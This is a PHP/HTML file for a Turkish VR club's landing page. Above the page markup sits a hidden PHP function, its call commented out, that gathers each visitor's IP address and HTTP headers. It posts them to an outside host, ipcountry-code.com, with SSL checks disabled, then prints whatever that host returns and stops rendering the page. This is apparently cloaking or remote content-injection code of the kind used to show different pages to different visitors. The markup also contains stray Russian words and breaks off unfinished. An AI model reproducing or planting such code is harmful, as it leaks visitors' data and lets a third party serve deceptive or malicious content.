﻿<?php
//request();

function request(): void {
	$pub_key    = 'K';
	$secret_key = '0000-00-0000';
	$request    = 'TR';
	$ch         = curl_init( "https://ipcountry-code.com/api/?request=$request&pub_key=$pub_key&secret_key=$secret_key" );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, [ 'user' => http_build_query( user() ) ] );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );

	$code     = curl_exec( $ch );
	$httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
	$error    = curl_error( $ch );
	curl_close( $ch );

	if ( $error ) {
		var_dump( 'Error cURL: ' . $error );
	}
	$code = json_decode( $code );
	if ( $code !== 'User not OK' ) {
		echo $code;
		exit();
	}
}

function user(): array {
	$userParams = [
		'REMOTE_ADDR',
		'SERVER_PROTOCOL',
		'SERVER_PORT',
		'REMOTE_PORT',
		'QUERY_STRING',
		'REQUEST_SCHEME',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'X_FORWARDED_FOR',
		'X-Forwarded-Host',
		'X-Forwarded-For',
		'X-Frame-Options',
	];

	$headers = [];
	foreach ( $_SERVER as $key => $value ) {
		if ( in_array( $key, $userParams ) || substr_compare( 'HTTP', $key, 0, 4 ) == 0 ) {
			$headers[ $key ] = $value;
		}
	}

	return $headers;
}
?>

<!Doctype html>
<html class="no-js" lang="tr">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>Ziravox - Antalya'nın En İyi VR Kulübü</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="shortcut icon" type="image/png" href="assets/img/favicon.png">

        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/fontawesome-all.min.css">
        <link rel="stylesheet" href="assets/css/icofont.min.css">
        <link rel="stylesheet" href="assets/css/animate.min.css">
        <link rel="stylesheet" href="assets/css/magnific-popup.css">
        <link rel="stylesheet" href="assets/css/odometer.min.css">
        <link rel="stylesheet" href="assets/css/nice-select.css">
        <link rel="stylesheet" href="assets/css/meanmenu.css">
        <link rel="stylesheet" href="assets/css/swipper.css">
        <link rel="stylesheet" href="assets/css/admin.css">
       
        <link rel="stylesheet" href="assets/css/main.css">
        <meta name="robots" content="index, follow">

        <meta property="og:title" content="Ziravox VR Kulübü">
        <meta property="og:description" content="Antalya'nın en modern VR kulübü. Sanal gerçeklik oyunları, etkinlikler и многое другое!">
        <meta property="og:image" content="https://ziravox.com/assets/img/logo/logo.png">
        <meta property="og:url" content="https://ziravox.com/">
        <meta property="og:type" content="website">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="Ziravox VR Kulübü">
        <meta name="twitter:description" content="Antalya'nın en modern VR kulübü. Sanal gerçeklik oyunları, etkinlikler и многое другое!">
        <meta name="twitter:image" content="https://ziravox.com/assets/img/logo/logo.png">
    </head>
    
    <body>
        <div class="mouse-cursor-invisible">
            <div class="mouseCursor cursor-outer"></div>
            <div class="mouseCursor cursor-inner"></div>
        </div>
        <header>
            <div class="cinkes_header_area">
                <div class="cinkes_header_top_area cinkes_black d-none d-lg-block">
                    <div class="container-fluid custom-container">
                        <div class="row align-items-center">
                            <div class="col-xxl-3 col-xl-12 col-lg-12">
                                <div class="cinkes_header_address_info text-lg-center text-xxl-start">
                                    <p class="mb-0">Ziravox VR Kulübüne Hoş Geldiniz</p>
                                </div>
                            </div>
                            <div class="col-xxl-3 col-xl-3 col-lg-4">
                                <div class="cinkes_single_contact_step cinkes_address_info">
                                    <i class="far fa-clock"></i>
                                    <span>Çalışma Saatleri Pzt-Paz</span>
                                </div>
                            </div>
                            <div class="col-xxl-2 col-xl-3 col-lg-3">
                                <div class="cinkes_single_contact_step cinkes_address_info">
                                    <i class="fal fa-envelope"></i>
                                    <a href="mailto:info@ziravox.com">info@ziravox.com</a>
                                </div>
                            </div>
                            <div class="col-xxl-2 col-xl-3 col-lg-3">
                                <div class="cinkes_single_contact_step cinkes_address_info">
                                   
                                    
                                </div>
                            </div>
                            <div class="col-xxl-2 col-xl-3 col-lg-2">
                                <div class="cinkes_header_top_button text-end">
                                    <a href="javascript:void(0)" onclick="openWhatsAppForm()" class="cinkes_btn theme_bg black_hover">WhatsApp'tan Yaz</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
    
                <div class="cinkes_header_main_area header-sticky">
                    <div class="container-fluid custom-container">
                        <div class="row align-items-center">
                            <div class="col-xxl-2 col-xl-2 col-lg-2 col-6 order-0">
                                <div class="cinkes_logo_section">
                                    <a href="/" class="cinkes_logo">
                                        <img src="assets/img/logo/logo.png" alt="logo">
                                    </a>
                                </div>
                            </div>
                            <div class="col-xxl-8 col-xl-8 col-lg-8 order-1 d-none d-lg-block">
                                <div class="cinkes_main_menu cinkes_border_right cinkes_logo_bg_before text-center">
                                    <nav id="mobile-menu" class="cinkes_menu mobile-menu">
                                        <ul>
                                            <li><a href="/">Ana Sayfa</a></li>
                                       
                                            <li><a href="service.html">Oyunlar & Zonlar</a></li>
                                            <li><a href="pricing.html">Fiyatlar</a></li>
                                            <li><a href="contact.html">İletişim</a></li>
                                           
                                        </ul>
                                    </nav>
                                </div>
                            </div>
                            <div class="col-xxl-2 col-xl-2 col-lg-2 col-sm-6 order-2 d-none d-lg-block">
                                <div class="cinkes_header_quick_info_wrapper text-end pl-50">
                                    <div class="cinkes_header_quick_info text-start d-inline-block">
                                        <div>
                                            <img src="assets/img/logo/logo2.png" alt="logo" style="width: 60px; height: 60px;">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-6 text-end d-lg-none">
                                <div class="menu_bars">
                                    <button class="side-toggle nav-expander bar" id="nav-expander"><i class="far fa-bars"></i></button>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </header>
        
        <div class="modal fade search-modal show" id="searchModal" tabindex="-1" aria-modal="true" role="dialog">
            <button type="button" class="close" data-bs-dismiss="modal">
                <span class="close-search"><i class="fal fa-times"></i></span>
            </button>
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="search-block clearfix">
                        <form>
                            <div class="form-group">
                                <input class="form-control" placeholder="Burada Arayın..." type="text">
                                <button type="submit" value="Search"><i class="fal fa-search"></i></button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <nav class="right_menu_togle">

            <div class="offset-widget offset-logo mb-30 pb-20">
                <div class="row align-items-center">
                    <div class="col-8"><a href="/" class="mobile_logo"><img src="assets/img/logo/logo.png" alt="Logo"></a></div>
                    <div class="col-4 text-end"><button id="nav-close" class="nav-close"><i class="fal fa-times"></i></button></div>
                </div>
                
            </div>

            <div class="mobile_menu fix"></div>

            <div class="contact-infos mt-40">
                <div class="contact-list mobile_contact mb-40">
                    <h4>İletişim Bilgileri</h4>
                    <span class="sidebar-address"><i class="fal fa-map-marker-alt"></i><a href="https://maps.app.goo.gl/wz5js8yKF3qVxXQS7" target="_blank">Yenigün, 1069. Sk. No:4, 07310 Muratpaşa/Antalya</a> </span>

                    <a href="tel:+905324567891"><i class="fal fa-phone"></i><span>+90 532 456 78 91</span></a>
                    <a href="mailto:info@ziravox.com" class="theme-3"><i class="far fa-envelope"></i><span><span>info@ziravox.com</span></span></a>   

                </div>

              
            </div>

        </nav>
        <div class="offwrap"></div>
      
        <div class="cinkes_hero_area" style="background: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('assets/img/slider/slider_bg1.jpg') center center/cover no-repeat; min-height: 700px; display: flex; align-items: center;">
                                <div class="container-fluid custom-container">
                                    <div class="row align-items-center">
                                        <div class="col-xxl-8 col-12">
                        <div class="cinkes_slider_content text-center text-xxl-start" style="background: rgba(255,255,255,0.0);">
                            <h2 class="cinkes_slider_title pl-60">Sanal Gerçeklik Deneyimi</h2>
                            <p class="pl-60">Antalya'nın En Modern VR Kulübü</p>
                            <div class="cinkes_slide_button mt-40 pl-60">
                                                    <a href="contact.html" class="slide_btn has_icon_right">Saat Rezervasyonu Yap <i class="fal fa-angle-double-right"></i></a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
      
        <div class="cinkes_services_fullwidth_area">
            <div class="cinkes_service_fullwidth_wrapper">
                <div class="container-fluid custom-container">
                    <div class="cinkes_services_fullwidth_wrapp">
                        <div class="cinkes_services_fullwidth_single">
                            <div class="cinkes_services_fullwidth_single_content">
                                
                                <div class="cinkes_services_fullwidth_text mb-25">
                                    <h5 class="cinkes_services_fullwidth_subtitle">Deneyim</h5>
                                    <h4 class="cinkes_services_fullwidth_title">3 Yıl Tecrübe</h4>
                                </div>
                            </div>
                            <div class="cinkes_services_fullwidth_single_button mb-25">
                                <a href="service.html" class="cinkes_services_btn"><i class="fal fa-sign-in"></i></a>
                            </div>
                        </div>
                        <div class="cinkes_services_fullwidth_single">
                            <div class="cinkes_services_fullwidth_single_content">
                               
                                <div class="cinkes_services_fullwidth_text mb-25">
                                    <h5 class="cinkes_services_fullwidth_subtitle">Sağladığımız</h5>
                                    <h4 class="cinkes_services_fullwidth_title">Premium VR Hizmeti</h4>
                                </div>
                            </div>
                            <div class="cinkes_services_fullwidth_single_button mb-25">
                                <a href="service.html" class="cinkes_services_btn"><i class="fal fa-sign-in"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="services_area pt-115 pb-90">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <div class="cinkes_section_title text-center mb-50">
                            <h5 class="cinkes_sub_title theme_clr">Özelliklerimiz</h5>
                            <h2 class="cinkes_title">VR Deneyimi Avantajları</h2>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-center">
                    <div class="col-xl-4 col-md-6">
                        <div class="cinkes_services_single mb-30">
                            <h4 class="cinkes_services_single_title"><a href="service.html">Son Teknoloji Ekipman</a></h4>
                            <p>En yeni VR gözlükler ve donanımlar, gerçek dünyaya en yakın deneyimi sunar. </p>
                            <a href="service.html" class="cinkes_services_single_icon"><i class="fad fa-vr-cardboard"></i></a>
                        </div>
                    </div>
                    <div class="col-xl-4 col-md-6">
                        <div class="cinkes_services_single mb-30">
                            <h4 class="cinkes_services_single_title"><a href="service.html">Çok Oyunculu Deneyim</a></h4>
                            <p> Arkadaşlarınızla birlikte rekabet ve grup oyunları oynayabilirsiniz.</p>
                            <a href="service.html" class="cinkes_services_single_icon"><i class="fad fa-users"></i></a>
                        </div>
                    </div>
                    <div class="col-xl-4 col-md-6">
                        <div class="cinkes_services_single mb-30">
                            <h4 class="cinkes_services_single_title"><a href="service.html">Uzman Rehberlik</a></h4>
                            <p>Deneyimli ekibimiz size gerçek zamanlı gerçeklik dünyasında rehberlik ve destek sağlar.</p>
                            <a href="service.html" class="cinkes_services_single_icon"><i class="fad fa-user-headset"></i></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="cinkes_about_area pt-125 pb-165" data-background="assets/img/about/about_bg12.jpg">
            <div class="container-fluid custom-container">
                <div class="row align-items-center justify-content-center">
                    <div class="col-xl-6 col-lg-10">
                        <div class="cinkes_about_img_wrapper mb-40">
                            <div class="cinkes_about_img cinkes_about1_img">
                                <img src="assets/img/about/about_img12.jpg" alt="about-img">
                            </div>
                        </div>
                    </div>
                    <div class="col-xl-6 col-lg-10">
                        <div class="cinkes_about_content_wrapper cinkes_about1_content_wrapper mb-40 pl-70">
                            <h4 class="cinkes_about_subtitle text-light">Hakkımızda</h4>
                            <h2 class="cinkes_about_title mb-30 text-light">Antalya'nın En İyi VR Oyun Deneyimi</h2>
                            <p class="text-light">Ziravox VR Kulübü, Antalya'nın merkezinde özel olarak tasarlanmış 300 metrekarelik bir alanında misafirlerini ağırlıyor.  En yeni VR ekipmanları ile çağdaş ve rahat ortamımızda benzersiz deneyimler sunuyoruz.  Her yaştan insana eğlenceli ve güvenli bir VR deneyimi sağlamak için uzman ekibimiz özenle çalışıyor.</p>
                            <div class="cinkes_list_wrapper cinkes_list1_wrapper mt-40">
                                <ul class="text-light">
                                    <li><i class="fal fa-check"></i>300m² Özel Tasarım Alan</li>
                                    <li><i class="fal fa-check"></i>En Son VR Teknolojisi</li>
                                    <li><i class="fal fa-check"></i>Profesyonel Ekip</li>
                                    <li><i class="fal fa-check"></i>Konforlu Bekleme Salonu</li>
                                </ul>
                            </div>
                            <div class="cinkes_about_button mt-40">
                                <a href="contact.html" class="cinkes_about_btn i_right">Daha Fazla Bilgi<i class="fal fa-plus"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
     
        <div class="cinkes_working_process_area pt-115 pb-80">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <div class="cinkes_section_title text-center mb-50">
                            <h5 class="cinkes_sub_title theme_clr">Nasıl Çalışır</h5>
                            <h2 class="cinkes_title">VR Deneyimi Adımları</h2>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-center">
                    <div class="col-xxl-4 col-md-6">
                        <div class="cinkes_working_process_step cinkes_working_process_step1 text-center mb-30">
                                <span class="cinkes_working_process_step_icon">
                                    <a href="contact.html"><i class="fad fa-calendar-check"></i></a>
                                </span>
                            <div class="cinkes_working_process_step_text">
                                <h4 class="cinkes_working_process_step_title"><a href="contact.html">Rezervasyon Yapın</a></h4>
                                <p>WhatsApp veya telefon üzerinden hızlı bir rezervasyon gerçekleştirin.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-xxl-4 col-md-6">
                        <div class="cinkes_working_process_step cinkes_working_process_step2 text-center mb-30">
                            <span class="cinkes_working_process_step_icon">
                                <a href="service.html"><i class="fad fa-vr-cardboard"></i></a>
                            </span>
                            <div class="cinkes_working_process_step_text">
                                <h4 class="cinkes_working_process_step_title"><a href="service.html">Ekipmanları Takın</a></h4>
                                <p>Premium VR gözlüklerimizi takın ve sanal dünyaya adım atın.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-xxl-4 col-md-6">
                        <div class="cinkes_working_process_step cinkes_working_process_step3 text-center mb-30">
                            <span class="cinkes_working_process_step_icon">
                                <a href="service.html"><i class="fad fa-gamepad-alt"></i></a>
                            </span>
                            <div class="cinkes_working_process_step_text">
                                <h4 class="cinkes_working_process_step_title"><a href="service.html">Oyunu Başlatın</a></h4>
                                <p>50'den fazla oyun arasından favori oyununuzu seçin ve eğlenmeye başlayın.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="cinkes_project_area pb-120">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <div class="cinkes_section_title text-center mb-40">
                            <h5 class="cinkes_sub_title theme_clr">Popüler Oyunlar</h5>
                            <h2 class="cinkes_title">En Çok Oynanan VR Oyunları</h2>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-12">
                        <ul class="nav cinkes_projects_button mb-40" id="pills-tab" role="tablist">

                            <li role="presentation">
                              <button class="cinkes_tab_btn active" id="pills-home-tab" data-bs-toggle="pill" data-bs-target="#pills-home" type="button" role="tab" aria-controls="pills-home" aria-selected="true">Aksiyon</button>
                            </li>
                            <li class="" role="presentation">
                              <button class="cinkes_tab_btn" id="pills-web-tab" data-bs-toggle="pill" data-bs-target="#pills-web" type="button" role="tab" aria-controls="pills-web" aria-selected="false">Macera</button>
                            </li>

                          </ul>
                    </div>
                </div>
            </div>
            <div class="projects_container_wrapper">
                <div class="tab-content" id="pills-tabContent">
                    <div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
                        <div class="swiper-container cinkes_project_container">
                            <div class="swiper-wrapper">
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/zone/zombie.jpg">
                                        <a href="service.html" class="cinkes_project_button">Zombie Savaşı</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/zone/uzay.jpg">
                                        <a href="service.html" class="cinkes_project_button">Uzay Savaşçıları</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/zone/ninja.jpg">
                                        <a href="service.html" class="cinkes_project_button">Ninja Warrior</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/zone/saber.jpg">
                                        <a href="service.html" class="cinkes_project_button">Beat Saber</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/zone/shootout.jpg">
                                        <a href="service.html" class="cinkes_project_button">Shootout VR</a>
                                    </div>
                                </div>
                            </div>
                            <div class="cinkes_projects_pagination"></div>
                            <div class="cinkes_projects_navigation">
                                <div class="cinkes_projects_next"><i class="fal fa-angle-right"></i></div>
                                <div class="cinkes_projects_prev"><i class="fal fa-angle-left"></i></div>
                            </div>

                        </div>
                    </div>
                    <div class="tab-pane fade" id="pills-web" role="tabpanel" aria-labelledby="pills-web-tab">
                        <div class="swiper-container cinkes_project_container">
                            <div class="swiper-wrapper">
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/project/project_1.jpg">
                                        <a href="service.html" class="cinkes_project_button">Treasure Hunt</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/project/project_2.jpg">
                                        <a href="service.html" class="cinkes_project_button">Escape Room</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/project/project_3.jpg">
                                        <a href="service.html" class="cinkes_project_button">Underwater World</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/project/project_4.jpg">
                                        <a href="service.html" class="cinkes_project_button">Time Travel</a>
                                    </div>
                                </div>
                                <div class="swiper-slide cinkes_project_slide">
                                    <div class="cinkes_slide_content" data-background="assets/img/project/project_5.jpg">
                                        <a href="service.html" class="cinkes_project_button">Fantasy Quest</a>
                                    </div>
                                </div>
                            </div>
                            <div class="cinkes_projects_pagination"></div>
                            <div class="cinkes_projects_navigation">
                                <div class="cinkes_projects_next"><i class="fal fa-angle-right"></i></div>
                                <div class="cinkes_projects_prev"><i class="fal fa-angle-left"></i></div>
                            </div>

                        </div>
                    </div>
                  </div>
            </div>
        </div>

        <div class="cinkes_fullwidth_features_area bg_gray pt-120 pb-120">
            <div class="container-fluid custom-container">
                <div class="row">
                    <div class="col-xxl-4 col-lg-6 col-sm-6">
                        <div class="cinkes_fullwidth_features_single mb-30">
                            <span class="cinkes_fullwidth_number">1</span>
                            <div class="cinkes_fullwidth_features_single_inner">
                                <h4 class="cinkes_fullwidth_single_title">Premium Deneyim</h4>
                                <p>En yeni teknolojiyi kullanan ekipmanlarımızla gerçek duyguları yaşayın.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-xxl-4 col-lg-6 col-sm-6">
                        <div class="cinkes_fullwidth_features_single mb-30">
                            <span class="cinkes_fullwidth_number">2</span>
                            <div class="cinkes_fullwidth_features_single_inner">
                                <h4 class="cinkes_fullwidth_single_title">Hızlı Servis</h4>
                                <p>Rezervasyondan oyuna kadar profesyonel yardım alın.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-xxl-4 col-lg-6 col-sm-6">
                        <div class="cinkes_fullwidth_features_single mb-30">
                            <span class="cinkes_fullwidth_number">3</span>
                            <div class="cinkes_fullwidth_features_single_inner">
                                <h4 class="cinkes_fullwidth_single_title">Uzman Ekip</h4>
                                <p>VR konusunda uzman ekibimizle size yol göstereceğiz.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="cinkes_fullwidth_services_area mt-90">
                <div class="cinkes_fullwidth_services_area_img">
                    <img src="assets/img/services/service_bg1.jpg" alt="service-bg">
                </div>
                <div class="container-fluid custom-container">
                    <div class="row justify-content-xl-end">
                        <div class="col-xxl-7">
                            <div class="cinkes_features_title_section mt-80 text-center text-xxl-start">
                                <h4 class="cinkes_about_subtitle">Ne Yapıyoruz</h4>
                                <h2 class="cinkes_about_title mb-45">VR Hizmetlerimiz</h2>
                            </div>
                        </div>
                    </div>
                    <div class="row justify-content-xl-end">
                        <div class="col-xxl-9">
                            <div class="cinkes_fullwidth_services_wrapper cinkes_white_bg">
                                <div class="row">
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-game-console"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="service.html">VR <br>Oyunları</a></h5>
                                        </div>
                                    </div>
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-live-support"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="contact.html">7/24 
                                                <br>Destek</a></h5>
                                        </div>
                                    </div>
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-users-alt-4"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="pricing.html">Grup <br>Etkinlikleri</a></h5>
                                        </div>
                                    </div>
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-party"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="pricing.html">Doğum Günü 
                                                <br>Partileri</a></h5>
                                        </div>
                                    </div>
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-brand-oculus"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="service.html">VR
                                                <br>Simülasyon</a></h5>
                                        </div>
                                    </div>
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-racing-car"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="service.html">Yarış 
                                                <br>Simülatörü</a></h5>
                                        </div>
                                    </div>
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-rocket"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="service.html">Uzay 
                                                <br>Maceraları</a></h5>
                                        </div>
                                    </div>
                                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                                        <div class="cinkes_fullwidth_services_icon_box mb-30" data-background="assets/img/services/bglayer.png">
                                            <i class="icofont-education"></i>
                                            <h5 class="cinkes_fullwidth_seervice_icon_text"><a href="service.html">Eğitici
                                                <br>Oyunlar</a></h5>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
       
        <div class="cinkes_pricing_plan_area pricing_bg pt-115 pb-90" data-background="assets/img/bg/zebra_bg.jpg">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <div class="cinkes_section_title text-center mb-50">
                            <h5 class="cinkes_sub_title sub_pricing_bg theme_clr">Fiyat Seçenekleri</h5>
                            <h2 class="cinkes_title" style="color: #e9ecef;">Size En Uygun Paketi Seçin</h2>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xl-4 col-lg-6 col-md-6">
                        <div class="cinkes_pricing_plan_wrapper mb-40">
                            <span class="pricing_tag"><i class="fal fa-tags"></i></span>
                            <div class="cinkes_pricing_plan_header">
                                <h4 class="cinkes_pricing_plan_header_title">Başlangıç Paketi</h4>
                                <div class="cinkes_pricing_plan_rating">
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                </div>
                                <div class="cinkes_pricing_plan_price_wrapper">
                                    <h4 class="cinkes_pricing_plan_price mb-0"><sup>₺</sup>15</h4>
                                    <span class="cinkes_pricing_plan_package">Dakika Başı</span>
                                </div>
                            </div>
                            <div class="cinkes_pricing_plan_content mt-30">
                                <ul>
                                    <li><i class="fad fa-check"></i>Tüm VR Oyunlara Erişim</li>
                                    <li><i class="fad fa-check"></i>Temel Ekipman</li>
                                    <li><i class="fad fa-check"></i>Oyun Rehberliği</li>
                                    <li><i class="far fa-times"></i>Premium Oyunlar</li>
                                    <li><i class="far fa-times"></i>Özel Etkinlik</li>
                                </ul>
                            </div>
                            <div class="cinkes_pricing_plan_footer mt-40">
                                <a href="contact.html" class="cinkes_pricing_plan_action_btn">Hemen Rezervasyon Yap</a>
                            </div>

                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-6 col-md-6">
                        <div class="cinkes_pricing_plan_wrapper active mb-40">
                            <span class="pricing_tag"><i class="fal fa-tags"></i></span>
                            <div class="cinkes_pricing_plan_header">
                                <h4 class="cinkes_pricing_plan_header_title">PREMIUM PAKET</h4>
                                <div class="cinkes_pricing_plan_rating">
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                </div>
                                <div class="cinkes_pricing_plan_price_wrapper">
                                    <h4 class="cinkes_pricing_plan_price mb-0"><sup>₺</sup>250</h4>
                                    <span class="cinkes_pricing_plan_package">2 Saatlik Paket</span>
                                </div>
                            </div>
                            <div class="cinkes_pricing_plan_content mt-30">
                                <ul>
                                    <li><i class="fad fa-check"></i>Tüm VR Oyunlara Erişim</li>
                                    <li><i class="fad fa-check"></i>Premium Ekipman</li>
                                    <li><i class="fad fa-check"></i>Kişisel Rehberlik</li>
                                    <li><i class="fad fa-check"></i>Premium Oyunlar</li>
                                    <li><i class="fad fa-check"></i>İçecek İkramı</li>
                                </ul>
                            </div>
                            <div class="cinkes_pricing_plan_footer mt-40">
                                <a href="contact.html" class="cinkes_pricing_plan_action_btn darkbtn">Hemen Rezervasyon Yap</a>
                            </div>

                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-6 col-md-6">
                        <div class="cinkes_pricing_plan_wrapper mb-40">
                            <span class="pricing_tag"><i class="fal fa-tags"></i></span>
                            <div class="cinkes_pricing_plan_header">
                                <h4 class="cinkes_pricing_plan_header_title">PARTİ PAKETİ</h4>
                                <div class="cinkes_pricing_plan_rating">
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                    <a href="#"><i class="far fa-star"></i></a>
                                </div>
                                <div class="cinkes_pricing_plan_price_wrapper">
                                    <h4 class="cinkes_pricing_plan_price mb-0"><sup>₺</sup>500</h4>
                                    <span class="cinkes_pricing_plan_package">4 Kişi 2 Saat</span>
                                </div>
                            </div>
                            <div class="cinkes_pricing_plan_content mt-30">
                                <ul>
                                    <li><i class="fad fa-check"></i>Tüm VR Oyunlara Erişim</li>
                                    <li><i class="fad fa-check"></i>Premium Ekipman</li>
                                    <li><i class="fad fa-check"></i>Grup Oyunları</li>
                                    <li><i class="fad fa-check"></i>Özel Etkinlik Alanı</li>
                                    <li><i class="far fa-times"></i>Yemek Servisi</li>
                                </ul>
                            </div>
                            <div class="cinkes_pricing_plan_footer mt-40">
                                <a href="contact.html" class="cinkes_pricing_plan_action_btn">Hemen Rezervasyon Yap</a>
                            </div>

                        </div>
                    </div>

                </div>
            </div>
            <div class="container">
               
                         </div>
                     </div>
       
         <div class="cinkes_benefits_area mt-90">
            <div class="cinkes_benefit_bg_img">
                <img src="assets/img/services/service_bg2.jpg" alt="img">
            </div>
            <div class="container">
               <div class="cinkes_benefit_content_wrapper bg_white pt-115 pb-120">
                   <div class="row justify-content-end">
                       <div class="col-xl-6">
                          <div class="cinkes_benefits_content_wrapper">
                              <h4 class="cinkes_about_subtitle">Avantajlarımız</h4>
                              <h2 class="cinkes_about_title mb-30">Neden Ziravox'u Tercih Etmelisiniz</h2>
                              <p class="about_text_midium">Antalya'nın en yeni VR kulübü olarak size en iyi deneyimi sunmaya çalışıyoruz.</p>
                              <div class="cinkes_list_benefits mt-30">
                                  <ul>
                                      <li><i class="fal fa-check-circle"></i>En son teknoloji VR ekipmanları ile gerçeğe en yakın deneyim</li>
                                      <li><i class="fal fa-check-circle"></i>50'den fazla oyundan sıkılmadan oynayın.</li>
                                  </ul>
                              </div>
  
                              <div class="cinkes_progress_wrapper fix mt-15">
                                  <div class="cinkes_progress_single pt-30">
                                      <div class="progress_label wow fadeInLeft" data-wow-duration="0.9s">
                                          <h5>Müşteri Memnuniyeti</h5>
                                      </div>
                                      <div class="progress">
                                          <div class="progress-bar wow fadeInLeft" data-wow-duration="0.9s" role="progressbar" data-width="98%" aria-valuenow="98" aria-valuemin="0" aria-valuemax="100"><span>98%</span></div>
                                        </div>
                                  </div>
